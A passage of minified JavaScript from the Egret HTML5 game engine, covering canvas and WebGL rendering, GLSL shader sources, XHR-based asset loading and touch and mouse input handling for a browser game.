e=i.instance,n=i._thisObject,r=i._callback,s=t.getTimer();r.call(n,s-e._time),e._time=s,e._requestAnimationId=i.requestAnimationFrame.call(window,i.prototype.enterFrame)},i.prototype.executeMainLoop=function(t,e){i._callback=t,i._thisObject=e,this.enterFrame()},i.prototype.reset=function(){var e=i.instance;e._requestAnimationId&&(e._time=t.getTimer(),i.cancelAnimationFrame.call(window,e._requestAnimationId),e.enterFrame())},i.prototype.registerListener=function(){var t=function(){i.instance.reset()};window.onfocus=t,window.onblur=function(){};var e,n;void 0!==document.hidden?(e="hidden",n="visibilitychange"):void 0!==document.mozHidden?(e="mozHidden",n="mozvisibilitychange"):void 0!==document.msHidden?(e="msHidden",n="msvisibilitychange"):void 0!==document.webkitHidden&&(e="webkitHidden",n="webkitvisibilitychange"),"onpageshow"in window&&"onpagehide"in window&&window.addEventListener("pageshow",t,!1),e&&n&&document.addEventListener(n,function(){document[e]||t()},!1)},i}(t.DeviceContext);t.HTML5DeviceContext=e,e.prototype.__class__="egret.HTML5DeviceContext"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t){this.canvas=t,this.canvasContext=t.getContext("2d");var i=this.canvasContext.setTransform,n=this;this.canvasContext.setTransform=function(t,e,r,s,o,a){n._matrixA=t,n._matrixB=e,n._matrixC=r,n._matrixD=s,n._matrixTx=o,n._matrixTy=a,i.call(n.canvasContext,t,e,r,s,o,a)},this._matrixA=1,this._matrixC=this._matrixB=0,this._matrixD=1,this._transformTy=this._transformTx=this._matrixTy=this._matrixTx=0,e.call(this)}return __extends(i,e),i.prototype.clearScreen=function(){this.setTransform(t.Matrix.identity.identity());for(var e=t.RenderFilter.getInstance().getDrawAreaList(),i=0,n=e.length;i<n;i++){var r=e[i];this.clearRect(r.x+this._transformTx,r.y+this._transformTy,r.width,r.height)}this.renderCost=0},i.prototype.clearRect=function(t,e,i,n){this.canvasContext.clearRect(t,e,i,n)},i.prototype.drawImage=function(i,n,r,s,o,a,h,l,p){n/=t.MainContext.instance.rendererContext.texture_scale_factor,r/=t.MainContext.instance.rendererContext.texture_scale_factor,s/=t.MainContext.instance.rendererContext.texture_scale_factor,o/=t.MainContext.instance.rendererContext.texture_scale_factor,i=i._bitmapData,a+=this._transformTx,h+=this._transformTy;var u=t.getTimer();this.canvasContext.drawImage(i,n,r,s,o,a,h,l,p),e.prototype.drawImage.call(this,i,n,r,s,o,a,h,l,p),this.renderCost+=t.getTimer()-u},i.prototype.setTransform=function(t){1==t.a&&0==t.b&&0==t.c&&1==t.d&&1==this._matrixA&&0==this._matrixB&&0==this._matrixC&&1==this._matrixD?(this._transformTx=t.tx-this._matrixTx,this._transformTy=t.ty-this._matrixTy):(this._transformTx=this._transformTy=0,this._matrixA==t.a&&this._matrixB==t.b&&this._matrixC==t.c&&this._matrixD==t.d&&this._matrixTx==t.tx&&this._matrixTy==t.ty||this.canvasContext.setTransform(t.a,t.b,t.c,t.d,t.tx,t.ty))},i.prototype.setAlpha=function(e,i){e!=this.canvasContext.globalAlpha&&(this.canvasContext.globalAlpha=e),i?(this.blendValue=i,this.canvasContext.globalCompositeOperation=i):this.blendValue!=t.BlendMode.NORMAL&&(this.blendValue=t.BlendMode.NORMAL,this.canvasContext.globalCompositeOperation=t.BlendMode.NORMAL)},i.prototype.setupFont=function(t){var e=this.canvasContext,i=(i=(i=t.italic?"italic ":"normal ")+(t.bold?"bold ":"normal "))+(t.size+"px ")+t.fontFamily;e.font=i,e.textAlign="left",e.textBaseline="middle"},i.prototype.measureText=function(t){return this.canvasContext.measureText(t).width},i.prototype.drawText=function(t,i,n,r,s){var o=t._strokeColorString,a=t.stroke,h=this.canvasContext;h.fillStyle=t._textColorString,h.strokeStyle=o,a&&(h.lineWidth=2*a,h.strokeText(i,n+this._transformTx,r+this._transformTy,s||65535)),h.fillText(i,n+this._transformTx,r+this._transformTy,s||65535),e.prototype.drawText.call(this,t,i,n,r,s)},i.prototype.strokeRect=function(t,e,i,n,r){this.canvasContext.strokeStyle=r,this.canvasContext.strokeRect(t,e,i,n)},i.prototype.pushMask=function(t){this.canvasContext.save(),this.canvasContext.beginPath(),this.canvasContext.rect(t.x+this._transformTx,t.y+this._transformTy,t.width,t.height),this.canvasContext.clip(),this.canvasContext.closePath()},i.prototype.popMask=function(){this.canvasContext.restore(),this.canvasContext.setTransform(1,0,0,1,0,0)},i}(t.RendererContext);t.HTML5CanvasRenderer=e,e.prototype.__class__="egret.HTML5CanvasRenderer"}(egret||(egret={}));var egret_h5_graphics;!function(t){t.beginFill=function(t,i){void 0===i&&(i=1);var n="rgba("+(t>>16)+","+((65280&t)>>8)+","+(255&t)+","+i+")";this.fillStyleColor=n,this.commandQueue.push(new e(this._setStyle,this,[n]))},t.drawRect=function(t,i,n,r){this.commandQueue.push(new e(function(t,e,i,n){var r=this.renderContext;this.canvasContext.beginPath(),this.canvasContext.rect(r._transformTx+t,r._transformTy+e,i,n),this.canvasContext.closePath()},this,[t,i,n,r])),this._fill()},t.drawCircle=function(t,i,n){this.commandQueue.push(new e(function(t,e,i){var n=this.renderContext;this.canvasContext.beginPath(),this.canvasContext.arc(n._transformTx+t,n._transformTy+e,i,0,2*Math.PI),this.canvasContext.closePath()},this,[t,i,n])),this._fill()},t.lineStyle=function(t,i,n,r,s,o,a,h){void 0===t&&(t=NaN),void 0===i&&(i=0),void 0===n&&(n=1),void 0===r&&(r=!1),void 0===s&&(s="normal"),void 0===o&&(o=null),void 0===a&&(a=null),void 0===h&&(h=3),this.strokeStyleColor&&(this.createEndLineCommand(),this.commandQueue.push(this.endLineCommand)),this.strokeStyleColor=i="rgba("+(i>>16)+","+((65280&i)>>8)+","+(255&i)+","+n+")",this.commandQueue.push(new e(function(t,e){this.canvasContext.lineWidth=t,this.canvasContext.strokeStyle=e,this.canvasContext.beginPath()},this,[t,i])),void 0===this.lineX&&(this.lineY=this.lineX=0),this.moveTo(this.lineX,this.lineY)},t.lineTo=function(t,i){this.commandQueue.push(new e(function(t,e){var i=this.renderContext;this.canvasContext.lineTo(i._transformTx+t,i._transformTy+e)},this,[t,i])),this.lineX=t,this.lineY=i},t.curveTo=function(t,i,n,r){this.commandQueue.push(new e(function(t,e,i,n){var r=this.renderContext;this.canvasContext.quadraticCurveTo(r._transformTx+t,r._transformTy+e,i,n)},this,[t,i,n,r])),this.lineX=n,this.lineY=r},t.moveTo=function(t,i){this.commandQueue.push(new e(function(t,e){var i=this.renderContext;this.canvasContext.moveTo(i._transformTx+t,i._transformTy+e)},this,[t,i]))},t.clear=function(){this.lineY=this.lineX=this.commandQueue.length=0,this.fillStyleColor=this.strokeStyleColor=null},t.createEndFillCommand=function(){this.endFillCommand||(this.endFillCommand=new e(function(){this.canvasContext.fill(),this.canvasContext.closePath()},this,null))},t.endFill=function(){null!=this.fillStyleColor&&this._fill(),this.fillStyleColor=null},t._fill=function(){this.fillStyleColor&&(this.createEndFillCommand(),this.commandQueue.push(this.endFillCommand))},t.createEndLineCommand=function(){this.endLineCommand||(this.endLineCommand=new e(function(){this.canvasContext.stroke(),this.canvasContext.closePath()},this,null))},t._draw=function(t){this.renderContext=t,(t=this.canvasContext=this.renderContext.canvasContext).save();var e=this.commandQueue.length;this.strokeStyleColor&&0<e&&this.commandQueue[e-1]!=this.endLineCommand&&(this.createEndLineCommand(),this.commandQueue.push(this.endLineCommand),e=this.commandQueue.length);for(var i=0;i<e;i++){var n=this.commandQueue[i];n.method.apply(n.thisObject,n.args)}t.restore()};var e=function(t,e,i){this.method=t,this.thisObject=e,this.args=i};e.prototype.__class__="Command",t._setStyle=function(t){this.canvasContext.fillStyle=t,this.canvasContext.beginPath()},t.init=function(){for(var e in t)egret.Graphics.prototype[e]=t[e];egret.RendererContext.createRendererContext=function(t){return new egret.HTML5CanvasRenderer(t)}}}(egret_h5_graphics||(egret_h5_graphics={})),egret_h5_graphics.init(),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(i){e.call(this),this.size=2e3,this.vertSize=6,this.contextLost=!1,this.glContextId=0,this.currentBlendMode="",this.currentBaseTexture=null,this.currentBatchSize=0,this.maskList=[],this.maskDataFreeList=[],this.canvasContext=document.createElement("canvas").getContext("2d"),console.log("使用WebGL模式"),this.canvas=i,i.addEventListener("webglcontextlost",this.handleContextLost.bind(this),!1),i.addEventListener("webglcontextrestored",this.handleContextRestored.bind(this),!1),this.projectionX=i.width/2,this.projectionY=-i.height/2,i=6*this.size,this.vertices=new Float32Array(4*this.size*this.vertSize),this.indices=new Uint16Array(i);for(var n=0,r=0;n<i;n+=6,r+=4)this.indices[n+0]=r+0,this.indices[n+1]=r+1,this.indices[n+2]=r+2,this.indices[n+3]=r+0,this.indices[n+4]=r+2,this.indices[n+5]=r+3;this.initWebGL(),this.shaderManager=new t.WebGLShaderManager(this.gl),this.worldTransform=new t.Matrix,this.initBlendMode(),t.MainContext.instance.addEventListener(t.Event.FINISH_RENDER,this._draw,this),t.TextField.prototype._draw=function(e){this.getDirty()&&(this.cacheAsBitmap=!0),t.DisplayObject.prototype._draw.call(this,e)}}return __extends(i,e),i.prototype.handleContextLost=function(){this.contextLost=!0},i.prototype.handleContextRestored=function(){this.initWebGL(),this.shaderManager.setContext(this.gl),this.contextLost=!1},i.prototype.initWebGL=function(){for(var t,e={stencil:!0},i=["experimental-webgl","webgl"],n=0;n<i.length;n++){try{t=this.canvas.getContext(i[n],e)}catch(t){}if(t)break}if(!t)throw Error("当前浏览器不支持webgl");this.setContext(t)},i.prototype.setContext=function(t){this.gl=t,t.id=this.glContextId++,this.vertexBuffer=t.createBuffer(),this.indexBuffer=t.createBuffer(),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer),t.bufferData(t.ELEMENT_ARRAY_BUFFER,this.indices,t.STATIC_DRAW),t.bindBuffer(t.ARRAY_BUFFER,this.vertexBuffer),t.bufferData(t.ARRAY_BUFFER,this.vertices,t.DYNAMIC_DRAW),t.disable(t.DEPTH_TEST),t.disable(t.CULL_FACE),t.enable(t.BLEND),t.colorMask(!0,!0,!0,!0)},i.prototype.initBlendMode=function(){i.blendModesWebGL[t.BlendMode.NORMAL]=[this.gl.ONE,this.gl.ONE_MINUS_SRC_ALPHA],i.blendModesWebGL[t.BlendMode.ADD]=[this.gl.SRC_ALPHA,this.gl.DST_ALPHA]},i.prototype.start=function(){if(!this.contextLost){var t=this.gl;t.activeTexture(t.TEXTURE0),t.bindBuffer(t.ARRAY_BUFFER,this.vertexBuffer),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer);var e=this.shaderManager.defaultShader;t.uniform2f(e.projectionVector,this.projectionX,this.projectionY);var i=4*this.vertSize;t.vertexAttribPointer(e.aVertexPosition,2,t.FLOAT,!1,i,0),t.vertexAttribPointer(e.aTextureCoord,2,t.FLOAT,!1,i,8),t.vertexAttribPointer(e.colorAttribute,2,t.FLOAT,!1,i,16)}},i.prototype.clearScreen=function(){var e=this.gl;e.colorMask(!0,!0,!0,!0);for(var i=t.RenderFilter.getInstance().getDrawAreaList(),n=0,r=i.length;n<r;n++){var s=i[n];e.viewport(s.x,s.y,s.width,s.height),e.bindFramebuffer(e.FRAMEBUFFER,null),e.clearColor(0,0,0,0),e.clear(e.COLOR_BUFFER_BIT)}this.renderCost=0},i.prototype.setBlendMode=function(e){if(e||(e=t.BlendMode.NORMAL),this.currentBlendMode!=e){var n=i.blendModesWebGL[e];n&&(this.gl.blendFunc(n[0],n[1]),this.currentBlendMode=e)}},i.prototype.drawImage=function(e,i,n,r,s,o,a,h,l){if(!this.contextLost){i/=m=t.MainContext.instance.rendererContext.texture_scale_factor,n/=m,r/=m,s/=m,this.createWebGLTexture(e),(e.webGLTexture!==this.currentBaseTexture||this.currentBatchSize>=this.size)&&(this._draw(),this.currentBaseTexture=e.webGLTexture);var p=this.worldTransform,u=p.a,d=p.b,c=p.c,_=p.d,g=p.tx,f=p.ty;0==o&&0==a||p.append(1,0,0,1,o,a),1==r/h&&1==s/l||p.append(h/r,0,0,l/s,0,0),o=p.a,a=p.b,h=p.c,l=p.d;var m=p.tx,y=p.ty;p.a=u,p.b=d,p.c=c,p.d=_,p.tx=g,p.ty=f,u=e._sourceWidth,d=e._sourceHeight,e=r,p=s,i/=u,n/=d,r/=u,s/=d,u=this.vertices,d=4*this.currentBatchSize*this.vertSize,c=this.worldAlpha,u[d++]=m,u[d++]=y,u[d++]=i,u[d++]=n,u[d++]=c,u[d++]=16777215,u[d++]=o*e+m,u[d++]=a*e+y,u[d++]=r+i,u[d++]=n,u[d++]=c,u[d++]=16777215,u[d++]=o*e+h*p+m,u[d++]=l*p+a*e+y,u[d++]=r+i,u[d++]=s+n,u[d++]=c,u[d++]=16777215,u[d++]=h*p+m,u[d++]=l*p+y,u[d++]=i,u[d++]=s+n,u[d++]=c,u[d++]=16777215,this.currentBatchSize++}},i.prototype._draw=function(){if(0!=this.currentBatchSize&&!this.contextLost){var e=t.getTimer();this.start();var i=this.gl;i.bindTexture(i.TEXTURE_2D,this.currentBaseTexture);var n=this.vertices.subarray(0,4*this.currentBatchSize*this.vertSize);i.bufferSubData(i.ARRAY_BUFFER,0,n),i.drawElements(i.TRIANGLES,6*this.currentBatchSize,i.UNSIGNED_SHORT,0),this.currentBatchSize=0,this.renderCost+=t.getTimer()-e,t.Profiler.getInstance().onDrawImage()}},i.prototype.setTransform=function(t){var e=this.worldTransform;e.a=t.a,e.b=t.b,e.c=t.c,e.d=t.d,e.tx=t.tx,e.ty=t.ty},i.prototype.setAlpha=function(t,e){this.worldAlpha=t,e&&this.setBlendMode(e)},i.prototype.createWebGLTexture=function(t){if(!t.webGLTexture){var e=this.gl;t.webGLTexture=e.createTexture(),e.bindTexture(e.TEXTURE_2D,t.webGLTexture),e.pixelStorei(e.UNPACK_PREMULTIPLY_ALPHA_WEBGL,!0),e.texImage2D(e.TEXTURE_2D,0,e.RGBA,e.RGBA,e.UNSIGNED_BYTE,t._bitmapData),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MAG_FILTER,e.LINEAR),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MIN_FILTER,e.LINEAR),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_S,e.CLAMP_TO_EDGE),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_T,e.CLAMP_TO_EDGE),e.bindTexture(e.TEXTURE_2D,null)}},i.prototype.pushMask=function(t){this._draw();var e=this.gl;0==this.maskList.length&&(e.enable(e.STENCIL_TEST),e.stencilFunc(e.ALWAYS,1,1));var i=this.maskDataFreeList.pop();i?(i.x=t.x,i.y=t.y,i.w=t.width,i.h=t.height):i={x:t.x,y:t.y,w:t.width,h:t.height},this.maskList.push(i),e.colorMask(!1,!1,!1,!1),e.stencilOp(e.KEEP,e.KEEP,e.INCR),this.renderGraphics(i),e.colorMask(!0,!0,!0,!0),e.stencilFunc(e.NOTEQUAL,0,this.maskList.length),e.stencilOp(e.KEEP,e.KEEP,e.KEEP)},i.prototype.popMask=function(){this._draw();var t=this.gl,e=this.maskList.pop();e&&(t.colorMask(!1,!1,!1,!1),t.stencilOp(t.KEEP,t.KEEP,t.DECR),this.renderGraphics(e),t.colorMask(!0,!0,!0,!0),t.stencilFunc(t.NOTEQUAL,0,this.maskList.length),t.stencilOp(t.KEEP,t.KEEP,t.KEEP),this.maskDataFreeList.push(e)),0==this.maskList.length&&t.disable(t.STENCIL_TEST)},i.prototype.setupFont=function(t){var e=this.canvasContext,i=(i=(i=t.italic?"italic ":"normal ")+(t.bold?"bold ":"normal "))+(t.size+"px ")+t.fontFamily;e.font=i,e.textAlign="left",e.textBaseline="middle"},i.prototype.measureText=function(t){return this.canvasContext.measureText(t).width},i.prototype.renderGraphics=function(t){var e=this.gl,i=this.shaderManager.primitiveShader;this.graphicsPoints?(this.graphicsPoints.length=0,this.graphicsIndices.length=0):(this.graphicsPoints=[],this.graphicsIndices=[],this.graphicsBuffer=e.createBuffer(),this.graphicsIndexBuffer=e.createBuffer()),this.updateGraphics(t),this.shaderManager.activateShader(i),e.blendFunc(e.ONE,e.ONE_MINUS_SRC_ALPHA),e.uniformMatrix3fv(i.translationMatrix,!1,this.worldTransform.toArray(!0)),e.uniform2f(i.projectionVector,this.projectionX,-this.projectionY),e.uniform2f(i.offsetVector,0,0),e.uniform3fv(i.tintColor,[1,1,1]),e.uniform1f(i.alpha,this.worldAlpha),e.bindBuffer(e.ARRAY_BUFFER,this.graphicsBuffer),e.vertexAttribPointer(i.aVertexPosition,2,e.FLOAT,!1,24,0),e.vertexAttribPointer(i.colorAttribute,4,e.FLOAT,!1,24,8),e.bindBuffer(e.ELEMENT_ARRAY_BUFFER,this.graphicsIndexBuffer),e.drawElements(e.TRIANGLE_STRIP,this.graphicsIndices.length,e.UNSIGNED_SHORT,0),this.shaderManager.activateShader(this.shaderManager.defaultShader)},i.prototype.updateGraphics=function(t){var e=this.gl;this.buildRectangle(t),e.bindBuffer(e.ARRAY_BUFFER,this.graphicsBuffer),e.bufferData(e.ARRAY_BUFFER,new Float32Array(this.graphicsPoints),e.STATIC_DRAW),e.bindBuffer(e.ELEMENT_ARRAY_BUFFER,this.graphicsIndexBuffer),e.bufferData(e.ELEMENT_ARRAY_BUFFER,new Uint16Array(this.graphicsIndices),e.STATIC_DRAW)},i.prototype.buildRectangle=function(t){var e=t.x,i=t.y,n=t.w;t=t.h;var r=this.graphicsPoints,s=this.graphicsIndices,o=r.length/6;r.push(e,i),r.push(0,0,0,1),r.push(e+n,i),r.push(0,0,0,1),r.push(e,i+t),r.push(0,0,0,1),r.push(e+n,i+t),r.push(0,0,0,1),s.push(o,o,o+1,o+2,o+3,o+3)},i.blendModesWebGL={},i}(t.RendererContext);t.WebGLRenderer=e,e.prototype.__class__="egret.WebGLRenderer"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.compileProgram=function(e,i,n){n=t.compileFragmentShader(e,n),i=t.compileVertexShader(e,i);var r=e.createProgram();return e.attachShader(r,i),e.attachShader(r,n),e.linkProgram(r),e.getProgramParameter(r,e.LINK_STATUS)||console.log("无法初始化着色器"),r},t.compileFragmentShader=function(e,i){return t._compileShader(e,i,e.FRAGMENT_SHADER)},t.compileVertexShader=function(e,i){return t._compileShader(e,i,e.VERTEX_SHADER)},t._compileShader=function(t,e,i){return i=t.createShader(i),t.shaderSource(i,e),t.compileShader(i),t.getShaderParameter(i,t.COMPILE_STATUS)?i:(console.log(t.getShaderInfoLog(i)),null)},t.checkCanUseWebGL=function(){if(void 0==t.canUseWebGL)try{var e=document.createElement("canvas");t.canUseWebGL=!(!window.WebGLRenderingContext||!e.getContext("webgl")&&!e.getContext("experimental-webgl"))}catch(e){t.canUseWebGL=!1}return t.canUseWebGL},t}();t.WebGLUtils=e,e.prototype.__class__="egret.WebGLUtils"}(egret||(egret={})),function(t){var e=function(){function t(t){this.maxAttibs=10,this.attribState=[],this.tempAttribState=[];for(var e=0;e<this.maxAttibs;e++)this.attribState[e]=!1;this.setContext(t)}return t.prototype.setContext=function(t){this.gl=t,this.primitiveShader=new n(t),this.defaultShader=new i(t),this.activateShader(this.defaultShader)},t.prototype.activateShader=function(t){this.gl.useProgram(t.program),this.setAttribs(t.attributes)},t.prototype.setAttribs=function(t){var e,i;for(i=this.tempAttribState.length,e=0;e<i;e++)this.tempAttribState[e]=!1;for(i=t.length,e=0;e<i;e++)this.tempAttribState[t[e]]=!0;for(t=this.gl,i=this.attribState.length,e=0;e<i;e++)this.attribState[e]!==this.tempAttribState[e]&&(this.attribState[e]=this.tempAttribState[e],this.tempAttribState[e]?t.enableVertexAttribArray(e):t.disableVertexAttribArray(e))},t}();t.WebGLShaderManager=e,e.prototype.__class__="egret.WebGLShaderManager";var i=function(){function e(t){this.defaultVertexSrc="attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec2 aColor;\nuniform vec2 projectionVector;\nuniform vec2 offsetVector;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nconst vec2 center = vec2(-1.0, 1.0);\nvoid main(void) {\n   gl_Position = vec4( ((aVertexPosition + offsetVector) / projectionVector) + center , 0.0, 1.0);\n   vTextureCoord = aTextureCoord;\n   vec3 color = mod(vec3(aColor.y/65536.0, aColor.y/256.0, aColor.y), 256.0) / 256.0;\n   vColor = vec4(color * aColor.x, aColor.x);\n}",this.program=null,this.fragmentSrc="precision lowp float;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nuniform sampler2D uSampler;\nvoid main(void) {\n   gl_FragColor = texture2D(uSampler, vTextureCoord) * vColor ;\n}",this.gl=t,this.init()}return e.prototype.init=function(){var e=this.gl,i=t.WebGLUtils.compileProgram(e,this.defaultVertexSrc,this.fragmentSrc);e.useProgram(i),this.uSampler=e.getUniformLocation(i,"uSampler"),this.projectionVector=e.getUniformLocation(i,"projectionVector"),this.offsetVector=e.getUniformLocation(i,"offsetVector"),this.dimensions=e.getUniformLocation(i,"dimensions"),this.aVertexPosition=e.getAttribLocation(i,"aVertexPosition"),this.aTextureCoord=e.getAttribLocation(i,"aTextureCoord"),this.colorAttribute=e.getAttribLocation(i,"aColor"),-1===this.colorAttribute&&(this.colorAttribute=2),this.attributes=[this.aVertexPosition,this.aTextureCoord,this.colorAttribute],this.program=i},e}();t.EgretShader=i,i.prototype.__class__="egret.EgretShader";var n=function(){function e(t){this.alpha=this.translationMatrix=this.attributes=this.colorAttribute=this.aVertexPosition=this.tintColor=this.offsetVector=this.projectionVector=this.program=null,this.fragmentSrc="precision mediump float;\nvarying vec4 vColor;\nvoid main(void) {\n   gl_FragColor = vColor;\n}",this.vertexSrc="attribute vec2 aVertexPosition;\nattribute vec4 aColor;\nuniform mat3 translationMatrix;\nuniform vec2 projectionVector;\nuniform vec2 offsetVector;\nuniform float alpha;\nuniform vec3 tint;\nvarying vec4 vColor;\nvoid main(void) {\n   vec3 v = translationMatrix * vec3(aVertexPosition , 1.0);\n   v -= offsetVector.xyx;\n   gl_Position = vec4( v.x / projectionVector.x -1.0, v.y / -projectionVector.y + 1.0 , 0.0, 1.0);\n   vColor = aColor * vec4(tint * alpha, alpha);\n}",this.gl=t,this.init()}return e.prototype.init=function(){var e=this.gl,i=t.WebGLUtils.compileProgram(e,this.vertexSrc,this.fragmentSrc);e.useProgram(i),this.projectionVector=e.getUniformLocation(i,"projectionVector"),this.offsetVector=e.getUniformLocation(i,"offsetVector"),this.tintColor=e.getUniformLocation(i,"tint"),this.aVertexPosition=e.getAttribLocation(i,"aVertexPosition"),this.colorAttribute=e.getAttribLocation(i,"aColor"),this.attributes=[this.aVertexPosition,this.colorAttribute],this.translationMatrix=e.getUniformLocation(i,"translationMatrix"),this.alpha=e.getUniformLocation(i,"alpha"),this.program=i},e}();t.PrimitiveShader=n,n.prototype.__class__="egret.PrimitiveShader"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this)}return __extends(i,e),i.prototype.proceed=function(e){if(e.dataFormat==t.URLLoaderDataFormat.TEXTURE)this.loadTexture(e);else if(e.dataFormat==t.URLLoaderDataFormat.SOUND)this.loadSound(e);else{var i=e._request,n=this.getXHR();n.onerror=function(i){t.IOErrorEvent.dispatchIOErrorEvent(e)},n.onload=function(i){switch(e.dataFormat){case t.URLLoaderDataFormat.TEXT:e.data=n.responseText;break;case t.URLLoaderDataFormat.VARIABLES:e.data=new t.URLVariables(n.responseText);break;case t.URLLoaderDataFormat.BINARY:e.data=n.response;break;default:e.data=n.responseText}t.callLater(t.Event.dispatchEvent,t.Event,e,t.Event.COMPLETE)},n.open(i.method,i.url,!0),this.setResponseType(n,e.dataFormat),i.method!=t.URLRequestMethod.GET&&i.data?i.data instanceof t.URLVariables?(n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send(i.data.toString())):(n.setRequestHeader("Content-Type","multipart/form-data"),n.send(i.data)):n.send()}},i.prototype.loadSound=function(e){function i(s){window.clearTimeout(r.__timeoutId),r.removeEventListener("canplaythrough",i,!1),r.removeEventListener("error",n,!1),(s=new t.Sound).audio=r,e.data=s,t.callLater(t.Event.dispatchEvent,t.Event,e,t.Event.COMPLETE)}function n(s){window.clearTimeout(r.__timeoutId),r.removeEventListener("canplaythrough",i,!1),r.removeEventListener("error",n,!1),t.IOErrorEvent.dispatchIOErrorEvent(e)}var r=new Audio(e._request.url);r.__timeoutId=window.setTimeout(i,100),r.addEventListener("canplaythrough",i,!1),r.addEventListener("error",n,!1),r.load()},i.prototype.getXHR=function(){return window.XMLHttpRequest?new window.XMLHttpRequest:new ActiveXObject("MSXML2.XMLHTTP")},i.prototype.setResponseType=function(e,i){switch(i){case t.URLLoaderDataFormat.TEXT:case t.URLLoaderDataFormat.VARIABLES:e.responseType=t.URLLoaderDataFormat.TEXT;break;case t.URLLoaderDataFormat.BINARY:e.responseType="arraybuffer";break;default:e.responseType=i}},i.prototype.loadTexture=function(e){var i=e._request,n=new Image;n.crossOrigin="Anonymous",n.onload=function(i){n.onerror=null,n.onload=null,(i=new t.Texture)._setBitmapData(n),e.data=i,t.callLater(t.Event.dispatchEvent,t.Event,e,t.Event.COMPLETE)},n.onerror=function(i){n.onerror=null,n.onload=null,t.IOErrorEvent.dispatchIOErrorEvent(e)},n.src=i.url},i}(t.NetContext);t.HTML5NetContext=e,e.prototype.__class__="egret.HTML5NetContext"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t){e.call(this),this.canvas=t,this._isTouchDown=!1}return __extends(i,e),i.prototype.run=function(){var e=this;window.navigator.msPointerEnabled?(this.canvas.addEventListener("MSPointerDown",function(t){e._onTouchBegin(t),t.stopPropagation(),t.preventDefault()},!1),this.canvas.addEventListener("MSPointerMove",function(t){e._onTouchMove(t),t.stopPropagation(),t.preventDefault()},!1),this.canvas.addEventListener("MSPointerUp",function(t){e._onTouchEnd(t),t.stopPropagation(),t.preventDefault()},!1)):t.MainContext.deviceType==t.MainContext.DEVICE_MOBILE?this.addTouchListener():t.MainContext.deviceType==t.MainContext.DEVICE_PC&&(this.addTouchListener(),this.addMouseListener()),window.addEventListener("mousedown",function(t){e.inOutOfCanvas(t)?e.dispatchLeaveStageEvent():e._isTouchDown=!0}),window.addEventListener("mouseup",function(t){e._isTouchDown&&e.inOutOfCanvas(t)&&e.dispatchLeaveStageEvent(),e._isTouchDown=!1})},i.prototype.addMouseListener=function(){var t=this;this.canvas.addEventListener("mousedown",function(e){t._onTouchBegin(e)}),this.canvas.addEventListener("mousemove",function(e){t._onTouchMove(e)}),this.canvas.addEventListener("mouseup",function(e){t._onTouchEnd(e)})},i.prototype.addTouchListener=function(){var t=this;this.canvas.addEventListener("touchstart",function(e){for(var i=e.changedTouches.length,n=0;n<i&&n<t.maxTouches;n++)t._onTouchBegin(e.changedTouches[n]);e.stopPropagation(),e.preventDefault()},!1),this.canvas.addEventListener("touchmove",function(e){for(var i=e.changedTouches.length,n=0;n<i&&n<t.maxTouches;n++)t._onTouchMove(e.changedTouches[n]);e.stopPropagation(),e.preventDefault()},!1),this.canvas.addEventListener("touchend",function(e){for(var i=e.changedTouches.length,n=0;n<i&&n<t.maxTouches;n++)t._onTouchEnd(e.changedTouches[n]);e.stopPropagation(),e.preventDefault()},!1),this.canvas.addEventListener("touchcancel",function(e){for(var i=e.changedTouches.length,n=0;n<i&&n<t.maxTouches;n++)t._onTouchEnd(e.changedTouches[n]);e.stopPropagation(),e.preventDefault()},!1)},i.prototype.inOutOfCanvas=function(t){return 0>(t=this.getLocation(this.canvas,t)).x||0>t.y||t.x>this.canvas.width||t.y>this.canvas.height},i.prototype.dispatchLeaveStageEvent=function(){t.MainContext.instance.stage.dispatchEventWith(t.Event.LEAVE_STAGE)},i.prototype._onTouchBegin=function(t){var e=this.getLocation(this.canvas,t),i=-1;t.hasOwnProperty("identifier")&&(i=t.identifier),this.onTouchBegan(e.x,e.y,i)},i.prototype._onTouchMove=function(t){var e=this.getLocation(this.canvas,t),i=-1;t.hasOwnProperty("identifier")&&(i=t.identifier),this.onTouchMove(e.x,e.y,i)},i.prototype._onTouchEnd=function(t){var e=this.getLocation(this.canvas,t),i=-1;t.hasOwnProperty("identifier")&&(i=t.identifier),this.onTouchEnd(e.x,e.y,i)},i.prototype.getLocation=function(e,i){var n,r,s=document.documentElement,o=window;"function"==typeof e.getBoundingClientRect?(r=e.getBoundingClientRect(),n=r.left,r=r.top):r=n=0,n+=o.pageXOffset-s.clientLeft,r+=o.pageYOffset-s.clientTop,null!=i.pageX?(s=i.pageX,o=i.pageY):(n-=document.body.scrollLeft,r-=document.body.scrollTop,s=i.clientX,o=i.clientY);var a=t.Point.identity;return a.x=(s-n)/t.StageDelegate.getInstance().getScaleX(),a.y=(o-r)/t.StageDelegate.getInstance().getScaleY(),a},i}(t.TouchContext);t.HTML5TouchContext=e,e.prototype.__class__="egret.HTML5TouchContext"}(egret||(egret={}));var __extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},jump;!function(t){var e=function(t){function 